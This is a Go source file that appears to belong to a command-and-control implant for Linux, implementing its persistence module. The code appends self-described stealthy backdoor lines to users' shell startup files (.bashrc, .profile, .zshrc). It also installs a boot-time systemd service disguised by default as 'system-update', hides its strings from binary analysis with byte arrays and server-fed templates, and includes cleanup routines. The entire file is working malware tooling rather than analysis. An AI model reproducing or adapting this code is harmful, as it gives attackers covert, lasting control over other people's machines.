// server/docker/payloads/Linux/action_persistence_linux.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"golang.org/x/sys/unix"
)

// PersistenceTemplate represents server-delivered template data (v2: array-based)
type PersistenceTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`   // 1=systemd, 2=bashrc, 3=cron, 4=launchd
	Templates []string `json:"tpl"` // Array indexed by position (no string keys)
	Params    []string `json:"p"`   // Parameters indexed by position
}

// Template indices (integers don't appear as strings in binary)
// Must match server-side constants in templates/persistence.go
const (
	// Systemd indices (0-29)
	idxUnitHeader    = 0
	idxDescPrefix    = 1
	idxServiceSuffix = 2
	idxAfterNetwork  = 3
	idxWantsNetwork  = 4
	idxServiceHeader = 5
	idxTypeSimple    = 6
	idxRestartAlways = 7
	idxRestartSec    = 8
	idxExecStart     = 9
	idxStdOutNull    = 10
	idxStdErrNull    = 11
	idxSecComment    = 12
	idxPrivateTmp    = 13
	idxNoNewPrivs    = 14
	idxProtectSys    = 15
	idxProtectHome   = 16
	idxReadWriteTmp  = 17
	idxInstallHeader = 18
	idxWantedBy      = 19
	// Systemd paths
	idxEtcSystemd           = 20
	idxDotConfig            = 21
	idxSystemdDir           = 22
	idxUserDir              = 23
	idxServiceExt           = 24
	idxMultiUserTargetWants = 25
	idxDefaultTargetWants   = 26
	idxDefaultSvcName       = 27
	idxProcSelfExe          = 28

	// Bashrc indices (30-49)
	idxBashIfSudo        = 30
	idxBashIfPgrep       = 31
	idxBashPgrepEnd      = 32
	idxBashNohup         = 33
	idxBashNohupEnd      = 34
	idxBashFi            = 35
	idxBashEndFi         = 36
	idxRcBashrc          = 37
	idxRcProfile         = 38
	idxRcBashProfile     = 39
	idxRcZshrc           = 40
	idxBashDetectPattern = 41
)

// Parameter indices
const (
	paramIdxServiceName = 0
	paramIdxDescription = 1
	paramIdxTarget      = 2
	paramIdxUserService = 3
)

// Short method codes (transformed by server: bashrc→b, systemd→s, cron→c, remove→r)
var (
	persistMethodBashrc  = string([]byte{0x62})       // b
	persistMethodSystemd = string([]byte{0x73})       // s
	persistMethodCron    = string([]byte{0x63})       // c
	persistMethodRemove  = string([]byte{0x72})       // r

	// Short flags (transformed from user-friendly flags on server side)
	persistFlagRaw         = string([]byte{0x2d, 0x31}) // -1
	persistFlagNoNohup     = string([]byte{0x2d, 0x32}) // -2
	persistFlagNoSilence   = string([]byte{0x2d, 0x33}) // -3
	persistFlagNoPgrep     = string([]byte{0x2d, 0x34}) // -4
	persistFlagNoSudoCheck = string([]byte{0x2d, 0x35}) // -5
	persistFlagCommand     = string([]byte{0x2d, 0x36}) // -6
	persistFlagFiles       = string([]byte{0x2d, 0x37}) // -7
	persistFlagFile        = string([]byte{0x2d, 0x38}) // -8
	persistFlagUser        = string([]byte{0x2d, 0x39}) // -9
	persistFlagName        = string([]byte{0x2d, 0x6e}) // -n
	persistFlagAll         = string([]byte{0x2d, 0x61}) // -a

	// Misc (minimal, needed for operations before template parsing)
	persistAmpersand = string([]byte{0x20, 0x26}) //  &
)

// PersistenceCommand handles various persistence mechanisms
type PersistenceCommand struct{}

// getTpl safely gets template value by index
func (c *PersistenceCommand) getTpl(template *PersistenceTemplate, idx int) string {
	if template != nil && template.Templates != nil && idx < len(template.Templates) {
		return template.Templates[idx]
	}
	return ""
}

// getParam safely gets param value by index
func (c *PersistenceCommand) getParam(template *PersistenceTemplate, idx int) string {
	if template != nil && template.Params != nil && idx < len(template.Params) {
		return template.Params[idx]
	}
	return ""
}

func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Parse template data from command if present
	var template *PersistenceTemplate
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
			template = &PersistenceTemplate{}
			if err := json.Unmarshal(decoded, template); err != nil {
				template = nil
			}
		}
	}

	method := args[0]
	switch method {
	case persistMethodBashrc:
		return c.handleBashrcPersistence(args[1:], template)
	case persistMethodSystemd:
		return c.handleSystemdPersistence(args[1:], template)
	case persistMethodCron:
		// Delegate to CronPersistenceCommand
		cronCmd := &CronPersistenceCommand{}
		return cronCmd.Execute(ctx, args[1:])
	case persistMethodRemove:
		if len(args) < 2 {
			return CommandResult{
				Output:   Err(E1),
				ExitCode: 1,
			}
		}
		return c.removePersistence(args[1], args[2:], template)
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}
}

// bashrcOptions holds payload generation options
type bashrcOptions struct {
	raw         bool
	noNohup     bool
	noSilence   bool
	noPgrep     bool
	noSudoCheck bool
}

// handleBashrcPersistence adds backdoor to shell initialization files
func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *PersistenceTemplate) CommandResult {
	var targetUser string
	var command string
	var targetFiles []string
	var allFiles bool
	var opts bashrcOptions

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case persistFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case persistFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case persistFlagFile:
			if i+1 < len(args) {
				targetFiles = append(targetFiles, args[i+1])
				i++
			}
		case persistFlagFiles:
			if i+1 < len(args) {
				files := strings.Split(args[i+1], ",")
				for _, f := range files {
					targetFiles = append(targetFiles, strings.TrimSpace(f))
				}
				i++
			}
		case persistFlagAll:
			allFiles = true
		case persistFlagRaw:
			opts.raw = true
		case persistFlagNoNohup:
			opts.noNohup = true
		case persistFlagNoSilence:
			opts.noSilence = true
		case persistFlagNoPgrep:
			opts.noPgrep = true
		case persistFlagNoSudoCheck:
			opts.noSudoCheck = true
		}
	}

	// Default to current user
	if targetUser == "" {
		currentUser, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   Err(E19),
				ExitCode: 1,
			}
		}
		targetUser = currentUser.Username
	}

	// Default command (current binary path)
	if command == "" {
		procSelfExe := c.getTpl(template, idxProcSelfExe)
		if procSelfExe == "" {
			procSelfExe = "/proc/self/exe" // minimal fallback
		}
		execPath, err := os.Readlink(procSelfExe)
		if err != nil {
			execPath = os.Args[0]
		}
		command = execPath + persistAmpersand
	}

	// Get user info
	u, err := user.Lookup(targetUser)
	if err != nil {
		return CommandResult{
			Output:   ErrCtx(E4, targetUser),
			ExitCode: 1,
		}
	}

	// Determine target files based on flags
	if allFiles {
		// --all: target all common RC files (get names from template)
		rcBashrc := c.getTpl(template, idxRcBashrc)
		rcProfile := c.getTpl(template, idxRcProfile)
		rcBashProfile := c.getTpl(template, idxRcBashProfile)
		rcZshrc := c.getTpl(template, idxRcZshrc)
		if rcBashrc == "" {
			rcBashrc = ".bashrc"
		}
		targetFiles = []string{
			filepath.Join(u.HomeDir, rcBashrc),
			filepath.Join(u.HomeDir, rcProfile),
			filepath.Join(u.HomeDir, rcBashProfile),
			filepath.Join(u.HomeDir, rcZshrc),
		}
	} else if len(targetFiles) == 0 {
		// No files specified: default to only .bashrc
		rcBashrc := c.getTpl(template, idxRcBashrc)
		if rcBashrc == "" {
			rcBashrc = ".bashrc"
		}
		targetFiles = []string{
			filepath.Join(u.HomeDir, rcBashrc),
		}
	} else {
		// Expand paths for specified files
		for i, file := range targetFiles {
			if strings.HasPrefix(file, "~/") {
				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
			} else if !filepath.IsAbs(file) {
				targetFiles[i] = filepath.Join(u.HomeDir, file)
			}
		}
	}

	var results []string

	// Generate backdoor payload using server-provided template
	backdoorPayload := c.generateBashrcPayload(command, template, opts)
	if backdoorPayload == "" {
		return CommandResult{
			Output:   Err(E18),
			ExitCode: 1,
		}
	}

	for _, file := range targetFiles {
		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
			results = append(results, ErrCtx(E11, file))
		} else {
			results = append(results, SuccCtx(S1, file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// generateBashrcPayload creates a stealthy backdoor payload using server-provided templates
func (c *PersistenceCommand) generateBashrcPayload(command string, template *PersistenceTemplate, opts bashrcOptions) string {
	// If --raw is specified, just return the command itself
	if opts.raw {
		return "\n" + command + "\n"
	}

	// Template is required
	if template == nil || template.Templates == nil || len(template.Templates) == 0 {
		return ""
	}

	// Build payload based on options
	var payload strings.Builder
	payload.WriteString("\n")

	indent := ""

	// Start SUDO_COMMAND check (unless --no-sudo-check)
	if !opts.noSudoCheck {
		payload.WriteString(c.getTpl(template, idxBashIfSudo))
		payload.WriteString("\n")
		indent = "    "
	}

	// Start pgrep check (unless --no-pgrep)
	if !opts.noPgrep {
		payload.WriteString(indent)
		payload.WriteString(c.getTpl(template, idxBashIfPgrep))
		payload.WriteString(command)
		payload.WriteString(c.getTpl(template, idxBashPgrepEnd))
		payload.WriteString("\n")
		indent += "    "
	}

	// Write the command execution line
	payload.WriteString(indent)
	if opts.noNohup && opts.noSilence {
		payload.WriteString(command)
		payload.WriteString(" &")
	} else if opts.noNohup {
		payload.WriteString("(")
		payload.WriteString(command)
		payload.WriteString(" > /dev/null 2>&1 &) 2>/dev/null")
	} else if opts.noSilence {
		payload.WriteString("(nohup ")
		payload.WriteString(command)
		payload.WriteString(" &) 2>/dev/null")
	} else {
		payload.WriteString(c.getTpl(template, idxBashNohup))
		payload.WriteString(command)
		payload.WriteString(c.getTpl(template, idxBashNohupEnd))
	}
	payload.WriteString("\n")

	// Close pgrep check (unless --no-pgrep)
	if !opts.noPgrep {
		if !opts.noSudoCheck {
			payload.WriteString("    ")
		}
		payload.WriteString(c.getTpl(template, idxBashFi))
		payload.WriteString("\n")
	}

	// Close SUDO_COMMAND check (unless --no-sudo-check)
	if !opts.noSudoCheck {
		payload.WriteString(c.getTpl(template, idxBashEndFi))
	}

	return payload.String()
}

// injectIntoRCFile adds backdoor to RC file using direct file operations
func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
	info, err := os.Stat(filepath)
	if err != nil {
		if os.IsNotExist(err) {
			return os.WriteFile(filepath, []byte(payload), 0644)
		}
		return err
	}

	content, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	if bytes.Contains(content, []byte(payload)) {
		return fmt.Errorf(Err(E5))
	}

	newContent := append(content, []byte("\n"+payload)...)
	return os.WriteFile(filepath, newContent, info.Mode())
}

// handleSystemdPersistence installs systemd service
func (c *PersistenceCommand) handleSystemdPersistence(args []string, template *PersistenceTemplate) CommandResult {
	var serviceName string
	var userService bool

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case persistFlagName:
			if i+1 < len(args) {
				serviceName = args[i+1]
				i++
			}
		case persistFlagUser:
			userService = true
		}
	}

	// Default service name from template
	if serviceName == "" {
		serviceName = c.getTpl(template, idxDefaultSvcName)
		if serviceName == "" {
			serviceName = "system-update"
		}
	}

	// Get current binary path
	procSelfExe := c.getTpl(template, idxProcSelfExe)
	if procSelfExe == "" {
		procSelfExe = "/proc/self/exe"
	}
	execPath, err := os.Readlink(procSelfExe)
	if err != nil {
		execPath = os.Args[0]
	}

	if userService {
		return c.installUserSystemdService(serviceName, execPath, template)
	}
	return c.installSystemSystemdService(serviceName, execPath, template)
}

// installUserSystemdService creates user-level systemd service
func (c *PersistenceCommand) installUserSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
	currentUser, err := user.Current()
	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	// Get paths from template
	dotConfig := c.getTpl(template, idxDotConfig)
	systemdDir := c.getTpl(template, idxSystemdDir)
	userDir := c.getTpl(template, idxUserDir)
	serviceExt := c.getTpl(template, idxServiceExt)

	if dotConfig == "" {
		dotConfig = ".config"
	}
	if systemdDir == "" {
		systemdDir = "systemd"
	}
	if userDir == "" {
		userDir = "user"
	}
	if serviceExt == "" {
		serviceExt = ".service"
	}

	// User systemd directory
	sysDir := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir)

	if err := os.MkdirAll(sysDir, 0755); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, sysDir),
			ExitCode: 1,
		}
	}

	serviceFile := filepath.Join(sysDir, name+serviceExt)

	serviceContent := c.generateSystemdService(name, execPath, true, template)
	if serviceContent == "" {
		return CommandResult{
			Output:   Err(E18),
			ExitCode: 1,
		}
	}

	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, serviceFile),
			ExitCode: 1,
		}
	}

	// Enable service
	if err := c.enableSystemdService(name, true, template); err != nil {
		return CommandResult{
			Output:   SuccCtx(S1, serviceFile),
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   SuccCtx(S1, serviceFile),
		ExitCode: 0,
	}
}

// installSystemSystemdService creates system-level systemd service
func (c *PersistenceCommand) installSystemSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
	etcSystemd := c.getTpl(template, idxEtcSystemd)
	if etcSystemd == "" {
		etcSystemd = "/etc/systemd/system"
	}

	if unix.Access(etcSystemd, unix.W_OK) != nil {
		return CommandResult{
			Output:   ErrCtx(E3, etcSystemd),
			ExitCode: 1,
		}
	}

	serviceExt := c.getTpl(template, idxServiceExt)
	if serviceExt == "" {
		serviceExt = ".service"
	}

	serviceFile := filepath.Join(etcSystemd, name+serviceExt)

	serviceContent := c.generateSystemdService(name, execPath, false, template)
	if serviceContent == "" {
		return CommandResult{
			Output:   Err(E18),
			ExitCode: 1,
		}
	}

	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, serviceFile),
			ExitCode: 1,
		}
	}

	// Create symlink for multi-user.target.wants
	multiUserTargetWants := c.getTpl(template, idxMultiUserTargetWants)
	if multiUserTargetWants == "" {
		multiUserTargetWants = "multi-user.target.wants"
	}

	wantsDir := filepath.Join(etcSystemd, multiUserTargetWants)
	if err := os.MkdirAll(wantsDir, 0755); err == nil {
		linkPath := filepath.Join(wantsDir, name+serviceExt)
		os.Symlink(serviceFile, linkPath)
	}

	return CommandResult{
		Output:   SuccCtx(S1, serviceFile),
		ExitCode: 0,
	}
}

// generateSystemdService creates systemd service configuration using server-provided templates
func (c *PersistenceCommand) generateSystemdService(name, execPath string, userService bool, template *PersistenceTemplate) string {
	if template == nil || template.Templates == nil || len(template.Templates) == 0 {
		return ""
	}

	description := c.getParam(template, paramIdxDescription)
	target := c.getParam(template, paramIdxTarget)

	var svc strings.Builder
	svc.WriteString(c.getTpl(template, idxUnitHeader))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxDescPrefix))
	svc.WriteString(description)
	svc.WriteString(c.getTpl(template, idxServiceSuffix))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxAfterNetwork))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxWantsNetwork))
	svc.WriteString("\n\n")
	svc.WriteString(c.getTpl(template, idxServiceHeader))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxTypeSimple))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxRestartAlways))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxRestartSec))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxExecStart))
	svc.WriteString(execPath)
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxStdOutNull))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxStdErrNull))
	svc.WriteString("\n\n")
	svc.WriteString(c.getTpl(template, idxSecComment))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxPrivateTmp))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxNoNewPrivs))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxProtectSys))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxProtectHome))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxReadWriteTmp))
	svc.WriteString("\n\n")
	svc.WriteString(c.getTpl(template, idxInstallHeader))
	svc.WriteString("\n")
	svc.WriteString(c.getTpl(template, idxWantedBy))
	svc.WriteString(target)
	svc.WriteString("\n")

	return svc.String()
}

// enableSystemdService attempts to enable service via systemd
func (c *PersistenceCommand) enableSystemdService(name string, userService bool, template *PersistenceTemplate) error {
	if userService {
		currentUser, err := user.Current()
		if err != nil {
			return err
		}

		dotConfig := c.getTpl(template, idxDotConfig)
		systemdDir := c.getTpl(template, idxSystemdDir)
		userDir := c.getTpl(template, idxUserDir)
		defaultTargetWants := c.getTpl(template, idxDefaultTargetWants)
		serviceExt := c.getTpl(template, idxServiceExt)

		if dotConfig == "" {
			dotConfig = ".config"
		}
		if systemdDir == "" {
			systemdDir = "systemd"
		}
		if userDir == "" {
			userDir = "user"
		}
		if defaultTargetWants == "" {
			defaultTargetWants = "default.target.wants"
		}
		if serviceExt == "" {
			serviceExt = ".service"
		}

		wantsDir := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir, defaultTargetWants)
		if err := os.MkdirAll(wantsDir, 0755); err != nil {
			return err
		}

		serviceFile := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir, name+serviceExt)
		linkPath := filepath.Join(wantsDir, name+serviceExt)

		return os.Symlink(serviceFile, linkPath)
	}

	return nil
}

// removePersistence removes installed persistence
func (c *PersistenceCommand) removePersistence(method string, args []string, template *PersistenceTemplate) CommandResult {
	switch method {
	case persistMethodBashrc:
		return c.removeBashrcPersistence(template)
	case persistMethodSystemd:
		var serviceName string
		for i := 0; i < len(args); i++ {
			if args[i] == persistFlagName && i+1 < len(args) {
				serviceName = args[i+1]
			}
		}
		if serviceName == "" {
			serviceName = c.getTpl(template, idxDefaultSvcName)
			if serviceName == "" {
				serviceName = "system-update"
			}
		}
		return c.removeSystemdPersistence(serviceName, template)
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}
}

// removeBashrcPersistence removes backdoors from RC files
func (c *PersistenceCommand) removeBashrcPersistence(template *PersistenceTemplate) CommandResult {
	currentUser, err := user.Current()
	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	// Get RC file names from template
	rcBashrc := c.getTpl(template, idxRcBashrc)
	rcProfile := c.getTpl(template, idxRcProfile)
	rcBashProfile := c.getTpl(template, idxRcBashProfile)
	rcZshrc := c.getTpl(template, idxRcZshrc)

	if rcBashrc == "" {
		rcBashrc = ".bashrc"
	}

	targetFiles := []string{
		filepath.Join(currentUser.HomeDir, rcBashrc),
		filepath.Join(currentUser.HomeDir, rcProfile),
		filepath.Join(currentUser.HomeDir, rcBashProfile),
		filepath.Join(currentUser.HomeDir, rcZshrc),
	}

	var results []string

	// Get detection pattern from template
	detectPattern := c.getTpl(template, idxBashDetectPattern)

	for _, file := range targetFiles {
		if err := c.cleanRCFile(file, detectPattern); err != nil {
			if !os.IsNotExist(err) {
				results = append(results, ErrCtx(E11, file))
			}
		} else {
			results = append(results, SuccCtx(S2, file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// cleanRCFile removes backdoor from RC file
func (c *PersistenceCommand) cleanRCFile(filePath string, detectPattern string) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	if detectPattern == "" {
		return nil // Nothing to detect
	}

	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := 0

	for i := 0; i < len(lines); i++ {
		line := lines[i]

		if strings.Contains(line, detectPattern) {
			skipNext = 4
			continue
		}

		if skipNext > 0 {
			skipNext--
			continue
		}

		cleanedLines = append(cleanedLines, line)
	}

	for len(cleanedLines) > 0 && cleanedLines[len(cleanedLines)-1] == "" {
		cleanedLines = cleanedLines[:len(cleanedLines)-1]
	}

	return os.WriteFile(filePath, []byte(strings.Join(cleanedLines, "\n")), 0644)
}

// removeSystemdPersistence removes systemd service
func (c *PersistenceCommand) removeSystemdPersistence(name string, template *PersistenceTemplate) CommandResult {
	var results []string

	// Get paths from template
	dotConfig := c.getTpl(template, idxDotConfig)
	systemdDir := c.getTpl(template, idxSystemdDir)
	userDir := c.getTpl(template, idxUserDir)
	serviceExt := c.getTpl(template, idxServiceExt)
	defaultTargetWants := c.getTpl(template, idxDefaultTargetWants)
	multiUserTargetWants := c.getTpl(template, idxMultiUserTargetWants)
	etcSystemd := c.getTpl(template, idxEtcSystemd)

	if dotConfig == "" {
		dotConfig = ".config"
	}
	if systemdDir == "" {
		systemdDir = "systemd"
	}
	if userDir == "" {
		userDir = "user"
	}
	if serviceExt == "" {
		serviceExt = ".service"
	}
	if defaultTargetWants == "" {
		defaultTargetWants = "default.target.wants"
	}
	if multiUserTargetWants == "" {
		multiUserTargetWants = "multi-user.target.wants"
	}
	if etcSystemd == "" {
		etcSystemd = "/etc/systemd/system"
	}

	// Try to remove user service
	currentUser, err := user.Current()
	if err == nil {
		userServiceFile := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir, name+serviceExt)
		userLinkPath := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir, defaultTargetWants, name+serviceExt)

		if err := os.Remove(userServiceFile); err == nil {
			results = append(results, SuccCtx(S2, userServiceFile))
		}
		os.Remove(userLinkPath)
	}

	// Try to remove system service
	systemServiceFile := filepath.Join(etcSystemd, name+serviceExt)
	systemLinkPath := filepath.Join(etcSystemd, multiUserTargetWants, name+serviceExt)

	if err := os.Remove(systemServiceFile); err == nil {
		results = append(results, SuccCtx(S2, systemServiceFile))
	}
	os.Remove(systemLinkPath)

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E4, name),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}
